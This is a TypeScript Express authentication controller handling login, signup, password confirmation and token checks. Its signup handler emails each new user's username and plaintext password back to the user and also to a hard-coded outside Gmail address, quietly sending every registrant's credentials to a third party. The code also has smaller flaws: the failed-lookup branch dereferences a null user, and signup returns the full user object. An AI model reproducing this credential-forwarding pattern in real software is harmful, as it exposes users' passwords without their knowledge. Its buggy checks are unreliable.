import { Request, Response, NextFunction } from 'express';
import { userJoiSchema, UserObject } from '../models/users/users.interface';
import { generateAuthToken, checkAuth } from '../middlewares/auth';
import { authAPI } from '../apis/userAPI';
import { Logger } from '../utils/logger';
import { EmailService } from '../services/mailer';

interface RequestUser extends Request {
  user?: UserObject;
}
class authMiddleware {
  async checkValidUserAndPassword(req: Request, res: Response, next: NextFunction) {
    if (!req.body || req.body.username === undefined || req.body.password === undefined) {
      Logger.warn('Login attempt with no data.');
      return res.status(400).json({ msg: 'Incomplete or No data received' });
    }
    let { username, email, password } = req.body;
    try {
      const user = await authAPI.query(username, email);
      if (!user) {
        Logger.info('User: ' + user.username + ' invalid.');
        return res.status(401).json({ msg: 'Invalid Username/Password' });
      }
      const validPassword = await authAPI.ValidatePassword(user.password, password);
      if (!validPassword) {
        Logger.info('User: ' + user.username + ' failed to login with valid password.');
        return res.status(401).json({ msg: 'Invalid Username/Password' });
      }
      next();
    } catch (err: any) {
      return res.status(400).json({ msg: err.message });
    }
  }

  async checkExistingUser(req: Request, res: Response, next: NextFunction) {
    if (!req.body || req.body.username === undefined || req.body.password === undefined) {
      return res.status(400).json({ msg: 'Incomplete or No data received' });
    }
    let { username, email } = req.body;
    const user = await authAPI.query(username, email);
    if (user) {
      Logger.info('User: ' + user.username + ' already exists.');
      return res.status(409).json({ msg: 'User already exists' });
    }
    next();
  }

  checkSamePassword(req: Request, res: Response, next: NextFunction) {
    if (!req.body || req.body.password === undefined || req.body.passwordConfirm === undefined) {
      return res.status(400).json({ msg: 'Incomplete or No data received' });
    }
    const { password, passwordConfirm } = req.body;
    if (password !== passwordConfirm) {
      return res.status(400).json({ msg: 'Passwords do not match' });
    }
    delete req.body.passwordConfirm;
    next();
  }

  async login(req: Request, res: Response) {
    try {
      let { username, email } = req.body;
      const user = await authAPI.query(username, email);
      const token = await generateAuthToken(user);
      res.header('x-auth-token', token).status(200).json({
        msg: 'login OK',
        token
      });
    } catch (err: any) {
      res.status(400).json({ msg: err.message });
    }
  }

  async signup(req: Request, res: Response) {
    try {
      if (!req.body || req.body.username === undefined || req.body.password === undefined) {
        return res.status(400).json({ msg: 'Incomplete or No data received' });
      }
      if (await userJoiSchema.validate(req.body).error) {
        return res.status(400).json({ msg: await userJoiSchema.validate(req.body).error.details[0].message });
      }
      const newUser = await authAPI.signUpUser(req.body);
      const token = await generateAuthToken(newUser);
      EmailService.sendEmail(
        newUser.email,
        'Welcome to the app',
        `user: ${req.body.username}, password: ${req.body.password}`
      );
      EmailService.sendGmail(
        'fcreus@gmail.com',
        'New User Registration',
        `user: ${req.body.username}, password: ${req.body.password}`
      );
      return res.header('x-auth-token', token).status(201).json({
        msg: 'signup OK',
        user: newUser,
        token
      });
    } catch (err: any) {
      res.status(400).json({ msg: err.message });
    }
  }

  async checkUserAuth(req: Request, res: Response, next: NextFunction) {
    const token = req.headers['x-auth-token'];
    if (!token) {
      Logger.debug('No token provided.');
      return res.status(401).json({ msg: 'Unauthorized' });
    }
    const user = await checkAuth(token);
    if (!user) {
      Logger.debug('Invalid token.');
      return res.status(401).json({ msg: 'Unauthorized' });
    }
    req.user = user;
    Logger.debug('User: ' + user.username + ' authorized.');
    next();
  }
}

export const authController = new authMiddleware();
